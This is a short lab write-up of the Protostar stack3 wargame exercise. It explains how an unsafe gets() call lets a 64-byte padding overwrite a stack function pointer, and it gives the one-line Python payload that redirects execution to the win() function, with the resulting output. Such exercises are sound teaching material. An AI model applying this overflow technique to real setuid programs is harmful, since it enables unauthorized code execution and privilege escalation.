### 1. Vulnerability Discovery

- By inspecting `/opt/protostar/bin/stack3`, we confirmed it is a 32-bit, setuid root, dynamically linked binary, not stripped.
- From the symbol table and disassembly:
  - The program has a function pointer on the stack, and accepts user input via an unsafe `gets()` call, which allows us to overwrite stack data.

- Disassembly analysis shows:
  - 0x08048424 = `win()` function
  - There is a call to `gets()` with a buffer, and then a function pointer is dereferenced/called depending on overwritten memory.

### 2. Exploitation Steps

- We tested several buffer lengths to control the function pointer.
- With 64 bytes of "A" padding and the address of `win()` (`0x08048424`), we get:

  ```
  python -c "print('A'*64+'\x24\x84\x04\x08')" | /opt/protostar/bin/stack3
  ```

  This prints:
  ```
  calling function pointer, jumping to 0x08048424
  code flow successfully changed
  ```

  This confirms arbitrary code execution by overwriting the function pointer.

- The binary is SUID root (as expected from protostar's stack3).

### 3. Privilege Escalation

- However, executing our payload does **not** drop a root shell or escalate privileges: `id` and `whoami` still show user.
- The win function only prints a message; it does **not** spawn a shell.

## Key Findings

- **Stack overflow via function pointer**: We can control code execution.
- **Demonstrated code flow change**: We proved the vulnerability is exploitable.
- **Privilege escalation to root is not part of the design of stack3's win() function**: It merely prints a message.
